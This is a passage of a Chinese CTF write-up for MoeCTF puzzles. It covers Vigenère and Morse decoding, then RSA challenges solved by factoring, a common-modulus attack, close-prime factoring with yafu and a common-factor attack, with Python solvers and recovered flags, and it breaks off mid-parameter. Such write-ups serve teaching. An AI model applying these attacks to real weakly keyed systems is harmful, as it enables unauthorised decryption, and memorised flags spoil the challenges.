<h4 id="不是“皇帝的新密码”"><a href="#不是“皇帝的新密码”" class="headerlink" title="不是“皇帝的新密码”"></a>不是“皇帝的新密码”</h4><p>不是凯撒密码 感觉是某种替换变种</p>
<p>scsfct{wOuSQNfF_IWdkNf_Jy_o_zLchmK_voumSs_zvoQ_loFyof_FRdiKf_4i4x4NLgDn}</p>
<p>md5 of flag (utf-8) <code>ea23f80270bdd96b5fcd213cae68eea5</code></p>
<p>scsfct{wOuSQNfF_IWdkNf_Jy_o_zLchmK_voumSs_zvoQ_loFyof_FRdiKf_4i4x4NLgDn}</p>
<p>moectf{mAnCTF<br>ascii<br>s -&gt; m  115  109  -6   20<br>c -&gt; o  99  111  +12  12<br>s -&gt; e  115  101  -14  12<br>f -&gt; c  102  99  -3   23<br>c -&gt; t  99  116  +17  17<br>t -&gt; f  116  102  -12  14</p>
<p>看不出啥规律来</p>
<p>试了下 维吉尼亚密码 爆破 <a href="https://www.dcode.fr/vigenere-cipher">https://www.dcode.fr/vigenere-cipher</a>  将部分明文设置为moectf</p>
<p><img src="/posts/undefined/2.png" alt="img"></p>
<p>给了个key 位 GOODJO 去提交flag 是错的 试了下GOODJOB </p>
<p><img src="/posts/undefined/3.png" alt="img"></p>
<p>得到flag moectf{vIgENErE_CIphEr_Is_a_lIttlE_hardEr_thaN_caEsar_CIphEr_4u4u4EXfXz}</p>
<h4 id="喵言喵语"><a href="#喵言喵语" class="headerlink" title="喵言喵语"></a>喵言喵语</h4><p>DESCRIPTION: 狗曰：”喵喵喵喵喵？？“<br>请解出后请转换为全大写，单词间以下划线分隔，套上moectf{}后提交<br>hint: Morse Code<br>喵喵？ 喵喵喵喵喵喵喵喵喵喵喵喵 喵喵喵 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵？ 喵喵喵喵喵？ 喵喵喵喵喵？喵喵？ 喵喵喵喵喵？ 喵喵喵喵喵喵 喵喵喵喵喵喵 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵？喵喵喵 喵喵喵喵喵？ 喵喵？ 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵喵喵喵喵 喵喵喵喵喵喵喵喵？ 喵喵？ 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵喵喵喵喵 喵喵喵 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵？喵喵喵 喵喵喵喵喵？ 喵喵喵喵喵？喵喵喵喵喵喵 喵喵喵喵喵？喵喵喵喵喵喵 喵喵喵 喵喵？喵喵喵喵喵喵 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵？喵喵喵 喵喵？喵喵？喵喵？ 喵喵喵喵喵喵喵喵？ 喵喵？喵喵？喵喵喵喵喵喵 喵喵喵喵喵喵 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵喵喵喵喵 喵喵？喵喵喵喵喵？喵喵？ 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵喵喵喵？喵喵喵 喵喵？喵喵喵喵喵喵喵喵？<br>看了下规律 应该是 3个一组  喵喵喵 和 喵喵？</p>
<p>分别替换为 -和 .<br>先将喵喵？ 替换为-  喵喵喵换为.  得到flag</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.... . ..--.- -.- .- .-- .- .. .. ..--.- -.-. .- - ..--.- -... ..- - ..--.- -... . ..--.- -.-. .- .-.. .-.. . -.. ..--.- --. --- ..- --.. .. ..--.- -... -.-- ..--.- .-. -..-</span><br></pre></td></tr></table></figure>



<p>根据要求替换为大写<br>THE_KAWAII_CAT_BUT_BE_CALLED_GOUZI_BY_RX<br>moectf{THE_KAWAII_CAT_BUT_BE_CALLED_GOUZI_BY_RX}</p>
<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="factor-signin-【-n素数分解】"><a href="#factor-signin-【-n素数分解】" class="headerlink" title="factor_signin 【 n素数分解】"></a>factor_signin 【 n素数分解】</h4><p>已知 n1 n2 c1 c2 e </p>
<p>n1 可分解为 p q </p>
<p>n2 可分解成32个质数 … 本想根据n1 分解p q 算出m高位 用 Stereotyped messages攻击 但是考虑到e 太大了 一直没跑出来 就边跑边将n2分解后的素数进行运算</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c1 =  <span class="number">10004937130983861141937782436252502991050957330184611684406783226971057978666503675149401388381995491152372622456604317681236160071166819028679754762162125904637599991943368450200313304999566592294442696755822585022667008378021280392976010576970877334159755332946926433635584313137140987588847077645814987268595739733550220882135750267567373532603503399428451548677091911410732474324157868011686641243202218731844256789044721309478991918322850448456919991540932206923861653518190974620161055008847475600980152660468279765607319838003177639654115075183493029803981527882155542925959658123816315099271123470754815045214896642428657264709805029840253303446203030294879166242867850331945166255924821406218090304893024711068773287842075208409312312188560675094244318565148284432361706108491327014254387317744284876018328591380705408407853404828189643214087638328376675071962141118973835178054884474523241911240926274907256651801384433652425740230755811160476356172444327762497910600719286629420662696949923799255603628210458906831175806791599965316549386396788014703044837917283461862338269599464440202019922379625071512100821922879623930069349084917919100015782270736808388388006084027673781004085620817521378823838335749279055639005125</span></span><br><span class="line">n1 =  <span class="number">343504538870081878757729748260620800783581983635281373321527119223374418103340873199654926888439040391545101913132680017655039577253974802351999985470115474655124168592386965001556620077117966153475518658881140827499124290142523464795351995478153288872749817655925271395693435582010998996210909883510311066017237567799370371513462802547313382594409676803895262837061350017911885033133654781876923251129406855067993830824618637981136966134029212516871210627954762147349788788999116702635535406398258621926040887099782494271000823401788337120154104692934583729065189687995570122890809807661370008740283447636580308161498808092269041815719148127168137018600113465985504975054319601741498799761500526467431533990903047624407330243357514588557352746347337683868781554819821575385685459666842162355673947984514687068626166144076257334426612302554448774082488600083569900006274897032242821388126274957846236552373226099112200392102883351088570736254707966329366625911183721875374731791052229266503696334310835323523568132399330263642353927504971311717117370721838701629885670598853025212521537158141447625623337563164790788106598854822686494249848796441153496412236527242235888308435573209980270776407776277489669763803746640746378181948641</span></span><br><span class="line">c2 =  <span class="number">4948422459907576438725352912593232312182623872749480015295307088166392790756090961680588458629287353136729331282506869598853654959933189916541367579979613191505226006688017103736659670745715837820780269669982614187726024837483992949073998289744910800139692315475427811724840888983757813069849711652177078415791290894737059610056340691753379065563574279210755232749774749757141836708161854072798697882671844015773796030086898649043727563289757423417931359190238689436180953442515869613672008678717039516723747808793079592658069533269662834322438864456440701995249381880745586708718334052938634931936240736457181295</span></span><br><span class="line">n2 =  <span class="number">8582505375542551134698364096640878629785534004976071646505285128223700755811329156276289439920192196962008222418309136528180402357612976316670896973298407081310073283979903409463559102445223030866575563539261326076167685019121804961393115251287057504682389257841337573435085535013992761172452417731887700665115563173984357419855481847035192853387338980937451843809282267888616833734087813693242841580644645315837196205981207827105545437201799441352173638172133698491126291396194764373021523547130703629001683366722885529834956411976212381935354905525700646776572036418453784898084635925476199878640087165680193737</span></span><br><span class="line"></span><br><span class="line">p1 = <span class="number">18055722101348711626577381571859114850735298658417345663254295930584841136416234624852520581982069555948490061840244710773146585295336094872892685938420880462305333393436098181186277450475949236132458958671804132443554885896037342335902958516394876382378829317303693655605215373555988755516058130500801822723195474873517960624159417903134580987202400855946137101429970119186394052011747475879598126195607938106163892658285305921071673588966184054026228745012993740035399652049777986535759039077634555909031397541116025395236871778797949216479130412500655359057128438928721459688727543057760739527720641179290282309741</span></span><br><span class="line">q1 = <span class="number">19024691283015651666032297670418553586155390575928421823630922553034857624430114628839720683172187406577114034710093054198921843669645736474448836706112221787749688565566635453151716934583685087745112614898780150391513798368931496744574075511968933800467288441832780919514199410584786925010518564670786685241724643282580795568609339268652910564215887176803735675069372979560024792322029911970574914829712553975379661212645059271137916107885326625543090473004683836665262304916304580076748336858662108554591235698235221618061328251985929904075811056422186525179189846420226944944513865790999242309352900287977666792901</span></span><br><span class="line"></span><br><span class="line">phi_n1=(p1-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi_n1)</span><br><span class="line">m1=<span class="built_in">pow</span>(c1,d,n1)</span><br><span class="line"><span class="built_in">print</span>(m1)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m1)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 212596243778918483494272111870643078241790667558485094730612682373848421645583137073007</span></span><br><span class="line"><span class="comment"># b&#x27;moectf&#123;fACtord6_And_YAfu_Are_6oth_go&#x27;</span></span><br></pre></td></tr></table></figure>



<h4 id="n-amp-n-【共模攻击】"><a href="#n-amp-n-【共模攻击】" class="headerlink" title="n&amp;n 【共模攻击】"></a>n&amp;n 【共模攻击】</h4><p>题目</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read().strip().encode()</span><br><span class="line"> </span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">n = p * q</span><br><span class="line">e1 = <span class="number">0x114514</span></span><br><span class="line">e2 = <span class="number">19198101</span></span><br><span class="line"> </span><br><span class="line">c1 = <span class="built_in">pow</span>(m,e1,n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m,e2,n)</span><br><span class="line"><span class="built_in">print</span>(c1)</span><br><span class="line"><span class="built_in">print</span>(c2)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 5776799746376051463605370130675046329799612910435315968508603116759552095183027263116443417343895252766060748671845650457077393391989018107887540639775168897954484319381180406512474784571389477212123123540984850033695748142755414954158933345476509573211496722528388574841686164433315356667366007165419697987147258498693175698918104120849579763098045116744389310549687579302444264316133642674648294049526615350011916160649448726069001139749604430982881450187865197137222762758538645387391379108182515717949428258503254717940765994927802512049427407583200118969062778415073135339774546277230281966880715506688898978925</span></span><br><span class="line"><span class="comment"># 4664955020023583143415931782261983177552050757537222070347847639906354901601382630034645762990079537901659753823666851165175187728532569040809797389706253282757017586285211791297567893874606446000074515260509831946210526182765808878824360460569061258723122198792244018463880052389205906620425625708718545628429086424549277715280217165880900037900983008637302744555649467104208348070638137050458275362152816916837534704113775562356277110844168173111385779258263874552283927767924979691542028126412133709129601685315027689094437957165812994784648540588277901241854031439324974562449032290219652206466731675967045633360</span></span><br><span class="line"><span class="comment"># 13612969130810965900902742090064423006385890357159609755971027204203418808937093492927060428980020085273603754747223030702684866992231913349067578014240319426522039068836171388168087260774376277346092066880984406890296520951318296354893551565670293486797637522297989653182109744864444697818991039473180752980752117041574628063002176339235126861152739066489620021077091941250365101779354009854706729448088217051728432010328667839532327286559570597994183126402340332924370812383312664419874352306052467284992411543921858024469098268800500500651896608097346389396273293747664441553194179933758992070398387066135330851531</span></span><br></pre></td></tr></table></figure>

<p>已知c1 c2 n e1 e2 求m </p>
<p>共模攻击</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):<span class="comment"># 欧几里得算法</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"> </span><br><span class="line">n =  <span class="number">13612969130810965900902742090064423006385890357159609755971027204203418808937093492927060428980020085273603754747223030702684866992231913349067578014240319426522039068836171388168087260774376277346092066880984406890296520951318296354893551565670293486797637522297989653182109744864444697818991039473180752980752117041574628063002176339235126861152739066489620021077091941250365101779354009854706729448088217051728432010328667839532327286559570597994183126402340332924370812383312664419874352306052467284992411543921858024469098268800500500651896608097346389396273293747664441553194179933758992070398387066135330851531</span></span><br><span class="line">c1 = <span class="number">5776799746376051463605370130675046329799612910435315968508603116759552095183027263116443417343895252766060748671845650457077393391989018107887540639775168897954484319381180406512474784571389477212123123540984850033695748142755414954158933345476509573211496722528388574841686164433315356667366007165419697987147258498693175698918104120849579763098045116744389310549687579302444264316133642674648294049526615350011916160649448726069001139749604430982881450187865197137222762758538645387391379108182515717949428258503254717940765994927802512049427407583200118969062778415073135339774546277230281966880715506688898978925</span></span><br><span class="line">c2 = <span class="number">4664955020023583143415931782261983177552050757537222070347847639906354901601382630034645762990079537901659753823666851165175187728532569040809797389706253282757017586285211791297567893874606446000074515260509831946210526182765808878824360460569061258723122198792244018463880052389205906620425625708718545628429086424549277715280217165880900037900983008637302744555649467104208348070638137050458275362152816916837534704113775562356277110844168173111385779258263874552283927767924979691542028126412133709129601685315027689094437957165812994784648540588277901241854031439324974562449032290219652206466731675967045633360</span></span><br><span class="line">e1 = <span class="number">0x114514</span></span><br><span class="line">e2 = <span class="number">19198101</span></span><br><span class="line">s = egcd(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line"><span class="comment"># 求模反元素</span></span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c1 = invert(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2 = invert(c2, n)</span><br><span class="line"> </span><br><span class="line">m = <span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n) % n</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure>

<h4 id="p-q-【大数分解】"><a href="#p-q-【大数分解】" class="headerlink" title="|p-q| 【大数分解】"></a>|p-q| 【大数分解】</h4><p>DESCRIPTION: what will next_prime cause?</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">    flag = fs.read().strip()</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">72</span></span><br><span class="line"> </span><br><span class="line">m = <span class="built_in">int</span>.from_bytes(flag,<span class="string">&quot;big&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, isPrime</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">next_prime</span>(<span class="params">p</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p += <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line"> </span><br><span class="line">p = getPrime(<span class="number">2048</span>)</span><br><span class="line">q = next_prime(p)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>,c)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># n = 329960318345010350458589325571454799968957932130539403944044204698872359769449414256378111233592533561892402020955736786563103586897940757198920737583107357264433730515123570697570757034221232010688796344257587359198400915567115397034901247038275403825404094129637119512164953012131445747740645183682571690806238508035172474685818036517880994658466362305677430221344381425792427288500814551334928982040579744048907401043058567486871621293983772331951723963911377839286050368715384227640638031857101612517441295926821712605955984000617738833973829140899288164786111118033301974794123637285172303688427806450817155786233788027512244397952849209700013205803489334055814513866650854230478124920442832221946442593769555237909177172933634236392800414176981780444770542047378630756636857018730168151824307814244094763132088236333995807013617801783919113541391133267230410179444855465611792191833319172887852945902960736744468250550722314565805440432977225703650102517531531476188269635151281661081058374242768608270563131619806585194608795817118466680430500830137335634289617464844004904410907221482919453859885955054140320857757297655475489972268282336250384384926216818756762307686391740965586168590784252524275489515352125321398406426217</span></span><br><span class="line"><span class="comment"># c = 307746143297103281117512771170735061509547958991947416701685589829711285274762039205145422734327595082350457374530975854337055433998982493020603245187129916580627539476324521854057990929173492940833073106540441902619425074887573232779899379436737429823569006431370954961865581168635086246592539153824456681688944066925973182272443586463636373955966146029489121226571408532284480270826510961605206483011204059402338926815599691009406841471142048842308786000059979977645988396524814553253493672729395573658564825709547262230219183672493306100392069182994445509803952976016630731417479238769736432223194249245020320183199001774879893442186017555682902409661647546547835345461056900610391514595370600575845979413984555709077635397717741521573798309855584473259503981955303774208127361309229536010653615696850725905168242705387575720694946072789441481191449772933265705810128547553027708513478130258801233619669699177901566688737559102165508239876805822898509541232565766265491283807922473440397456701500524925191214292669986798631732639221198138026031561329502985577205314190565609214349344303324429408234237832110076900414483795318189628198913032900272406887003325858236057373096880675754802725017537119549989304878960436575670784578550</span></span><br></pre></td></tr></table></figure>

<p>已知n c e , 但是n无法通过在线分解出来 p 和 q 相差较小</p>
<p>可能考察的大数分解法 用yafu去分解 得到p q</p>
<p>yafu-x64 “factor(@)” -batchfile data.txt</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">n = <span class="number">329960318345010350458589325571454799968957932130539403944044204698872359769449414256378111233592533561892402020955736786563103586897940757198920737583107357264433730515123570697570757034221232010688796344257587359198400915567115397034901247038275403825404094129637119512164953012131445747740645183682571690806238508035172474685818036517880994658466362305677430221344381425792427288500814551334928982040579744048907401043058567486871621293983772331951723963911377839286050368715384227640638031857101612517441295926821712605955984000617738833973829140899288164786111118033301974794123637285172303688427806450817155786233788027512244397952849209700013205803489334055814513866650854230478124920442832221946442593769555237909177172933634236392800414176981780444770542047378630756636857018730168151824307814244094763132088236333995807013617801783919113541391133267230410179444855465611792191833319172887852945902960736744468250550722314565805440432977225703650102517531531476188269635151281661081058374242768608270563131619806585194608795817118466680430500830137335634289617464844004904410907221482919453859885955054140320857757297655475489972268282336250384384926216818756762307686391740965586168590784252524275489515352125321398406426217</span></span><br><span class="line">c = <span class="number">307746143297103281117512771170735061509547958991947416701685589829711285274762039205145422734327595082350457374530975854337055433998982493020603245187129916580627539476324521854057990929173492940833073106540441902619425074887573232779899379436737429823569006431370954961865581168635086246592539153824456681688944066925973182272443586463636373955966146029489121226571408532284480270826510961605206483011204059402338926815599691009406841471142048842308786000059979977645988396524814553253493672729395573658564825709547262230219183672493306100392069182994445509803952976016630731417479238769736432223194249245020320183199001774879893442186017555682902409661647546547835345461056900610391514595370600575845979413984555709077635397717741521573798309855584473259503981955303774208127361309229536010653615696850725905168242705387575720694946072789441481191449772933265705810128547553027708513478130258801233619669699177901566688737559102165508239876805822898509541232565766265491283807922473440397456701500524925191214292669986798631732639221198138026031561329502985577205314190565609214349344303324429408234237832110076900414483795318189628198913032900272406887003325858236057373096880675754802725017537119549989304878960436575670784578550</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"> </span><br><span class="line">p = <span class="number">18164809890142267890219276206773099235072154806950582020347085518282960761937147879570277730919110196557742226232054602784278585009762036923951358612733074768279344311938292845187804144458991947979616574535662033512236959010688698879953460760771547964758688700129994322153904156260452550830932232536673055480604083903327472696393017478985867846428177588049472509968031143243583420309569129756696755744088888618703553769561648077215188783123207031628505020478500655602448720006243614258852026797076054766680755124052134730998085155245587457870148748357237005392662882609410088994421984160941612734270140092780661013147</span></span><br><span class="line">q = <span class="number">18164809890142267890219276206773099235072154806950582020347085518282960761937147879570277730919110196557742226232054602784278585009762036923951358612733074768279344311938292845187804144458991947979616574535662033512236959010688698879953460760771547964758688700129994322153904156260452550830932232536673055480604083903327472696393017478985867846428177588049472509968031143243583420309569129756696755744088888618703553769561648077215188783123207031628505020478500655602448720006243614258852026797076054766680755124052134730998085155245587457870148748357237005392662882609410088994421984160941612734270140092780661012811</span></span><br><span class="line"> </span><br><span class="line">phi = (q-<span class="number">1</span>)*(p-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 249570974874683965885412406252605618726234717727556010398801764299908492512193226188087080181411750441170733603594547698398355811259760491544478706104866437273570349903637264438082036501309893201853054530797085698086038930446341917253155542909918241109987960175261486095152611819450932537581881711935930523418301766075705320203488107026433326292326129964637231122450539195821148674656840827466506395467469336596187495150898167299757789760635604231119016080856416978094961880727247145339982410533843888681043762135779060589853641865062809008652863428511798134312640617069911330859586320707783253640468229637716197145456887151857321060895164506792959237583562153616821715227622149105424842796708765315185129394537990268953771886929129434944500627323270496299902926231322790089251488584050110359247631650371779539584638092613495249267770302548319160951648265502444728433845081216709475591663328705134345555015199691574797815881902074474740834019596217789390369463038413250460469981479445571182983708770974508871216230067364084569609345681679365899779149338405373793064777911745712622109982221760064168488212106983408084522488047694941657394970605812241695735043502461108018842446035680879002550530817399147238728181034578381424909192073</span></span><br><span class="line"><span class="comment"># 105729052004695709707494302269801507248481230436271190010483646186661275972279555995233438869567815797586929422044928213974555400264124465863739443775408739791783027036876669</span></span><br><span class="line"><span class="comment"># b&#x27;moectf&#123;it_iS_vUlnErablE_iF_p_iS_aboUt_thE_SaME_SiZE_aS_Q_MVoAYArrlG3uco&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="rsa-signin-【公共因子攻击】"><a href="#rsa-signin-【公共因子攻击】" class="headerlink" title="rsa_signin 【公共因子攻击】"></a>rsa_signin 【公共因子攻击】</h4><p>DESCRIPTION: 真 signin</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read().strip()</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">int</span>.from_bytes(flag, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrimeimpo</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    p = getPrime(<span class="number">1024</span>)</span><br><span class="line">    q = getPrime(<span class="number">1024</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 17524722204224696445172535263975543817720644608816706978363749891469511686943372362091928951563219068859089058278944528021615923888948698587206920445508493551162845371086030869059282352535451058203615402089133135136481314666971507135484450966505425514285114192275051972496161810571035753943880190780759479521486741046704043699838021850105638224212696697865987677760179564370167062037563913329993433080123575434871852732981112883423565015771421868680113407260917902892944119552200927337996135278491046562185003012971570532979090484837684759828977460570826320870379601193678304983534424368152743368343335213808684523217</span></span><br><span class="line"><span class="string">c = 6870605439714128574950893771863182370595667973241984289208050776870220326525943524507319708560433091378319367164606150977103661770065561661544375425887970907060665421562712515902428061727268441585629591525591001533188276465911918724808701356962871139957343861919730086334623932624184172272488406793955068827527130338853980609365042071290967556159598511667974987218999253443575482949258292953639729393456515185185102248985930422080581185292420347510600574229080211050520146551505605537486989306457793451086767402197128573781597156939709237045132856159368959981648969874765462190363842275826077556314448408825308218451</span></span><br><span class="line"><span class="string">n = 24974121071274650888046048586598797033399902532613815354986756278905133499432183463847175542164798764762683121930786715931063152122056911933710481566265603626437742951648885379847799327315791800670175616973945640322985175516271373004547752061826574576722667907302681961850865961386200909397231865804894418194711076667760169256682834206788730947602211228930301853348503098156592000286467190760378847541148772869356389938999094673945092387627113807899212568399028514283219850734634544982646070106811651490010946670117927664594365986238107951837041859682547029079035013475238052160645871718246031144694712586073789250183</span></span><br><span class="line"><span class="string">c = 10324627733161143472233272675096997859064721978612320424254305978486200326061730105384511258706433940176741256952824288120499229240005823611541292676234913505775165761543820764046537413943393325463602612485849366939102550336256797820440347815027443410399157963547486098366749815425187247171697678576246606105486928212486117878157055321965270364583625270716186820068538749425299073309429589410882809098930213978117176627031795312102177342499674234163614021182116065492884880492891668658240362567156235958605768725892407536211503981819707919444725863397622629226309480836486427388484176463279384813974310500625102568341</span></span><br><span class="line"><span class="string">n = 14215826065753265334521416948225868542990756976323308408298887797364519400310818641526401662106853573185085731682502059761982246604277475488691297554851873224516934619888327644352138127883043558424300092247604877819821625587944308487310522092440517150600171819145803937177931473336108429889165189521078678397694303305705260759351843006130968234071638035667854938070597400634242396852782331461576526836227336952718230741560369621645218729592233657856104560425642219241082727756696967324334634822771842625681505869025740662258929200756109704988223034840699133778958569054445520305361142302393767439478256174414187983763</span></span><br><span class="line"><span class="string">c = 415916446053083522663299405080903121619846594209033663622616979372099135281363175464579440520262612010099820951944229484417996994283898028928384268216113118778734726335389504987546718739928112684600918108591759061734340607527889972020273454098314620790710425294297542021830654957828983606433731988998097351888879368160881316237557097381718444193741788664735559392675419489952796677690968481917700683813252460912749931286739585465657312416977086336732056497161860235343155953578618273940135486362350057858779130960380833359506761436212727289297656191243565734621757889931250689354508999144817518599291078968866323093</span></span><br><span class="line"><span class="string">n = 12221355905532691305226996552124162033756814028292708728711809229588190407700199452617060657420166395065565154239801465361510672853972152857415394695376825120759202857555325904640144375262531345320714166285999668052224661520834318497234299585219832943519644095197479639328120838919035625832361810964127485907587199925564724081163804724975965691571850962714258888527902920462746795712011579424322515292865504642938090200503979483095345893697972170153990274670257331483858538617460680462369680572833191232126527727222302641204529110948993583190295067970240051042000918629138767209918572311469915774910003970381965123241</span></span><br><span class="line"><span class="string">c = 2248834602646305164283014556051672824689884721514190813323189875541899566338153534858709617544459297836048770439230174669883719627734394673012731609952869246171300132019334542245094425654362711870373095782083791160029789553806741967408922001051006100049326921742208757147339981269528740944842177729701945606827918253016001436218891580980192743564642120923356793292885805519110411357830040053435569937296612987581482128241218218550319154933831743819546558930918761162723110000328532730751591375727881221199739397698390594797621758011191224528339478784930214820615602510460640307707682865125229937141010351138099874025</span></span><br><span class="line"><span class="string">n = 18152103454920389919231636321286527841833809319334215885641536161086810144890443857211776387914779781628740172079478910188540146498426564211851629962338413488555121865779016981727229209606498886170396500155102635962395243364899026418106378234307821492609778555173516000309435730752571818439328803899462791834490025768785383592935046996428331508608555503567191807692523852530836008436655164751054189301721070209363416058642811329040202582026786024825518381761299547703962502636888833428457116986351812252188468878701301184044948733274488264320930936362549028124581962244201377136969591119942276742760215403738913067567</span></span><br><span class="line"><span class="string">c = 2797812094994121597295362327809389195134238119144547570610194659000554967367804835006774413888965325870488368112707535584687083342412367127561646136089638402907513075405746055834487062923240856950047936297155455745928810738711368950139327254040579266046642851362228893522740216519732851152162928545416236075387903789535000820423985522550638100049857678600662008021574841083416323980817348573062083159710189689337626277009675683473560325178417766400002763719953723259300977655801234386662217462862844994462505601804422871991694828697337752697234180117437785537788728412520613916334045368736691714704501962513954509705</span></span><br><span class="line"><span class="string">n = 22877887459293720334652698748191453972019668578065068224653972884599636421200068659750242304040301306798039254241668648594556654589309801728248683586229288074709849246660525799452637187132633064172425677552176203292787732404537215347782229753837476655088638984496409603054524994383358547132112778403912563916886533181616856401929346567686400616307916690806467019665390260267596320840786982457521423178851498130935577260638269429250197050326097193841333205073650802709022947551398142692735680419453533128176592587955634333425401930362881423044363132586170013458300714163531162544301477356808388416864173949089028317961</span></span><br><span class="line"><span class="string">c = 12271947322974809255127222556723394446467844330408506340843897575503534175121932185624776713618037572593449207329510171212097269297133492090526270770286000839978630002819714376964416081198925899119135271459404333829811516667576167576916805217016117373027245648473458331936273975110163065432285322832123169216976420362833557809289561705091817949915218278430834098156335989014645979633658818904753942786129126233956314517292746008579152368541316795082120147520597254020266752859205131887527661767589367756335766220841483940854397440079467053684289006956034944336788288196391829411432383541473132962783883758561108297747</span></span><br><span class="line"><span class="string">n = 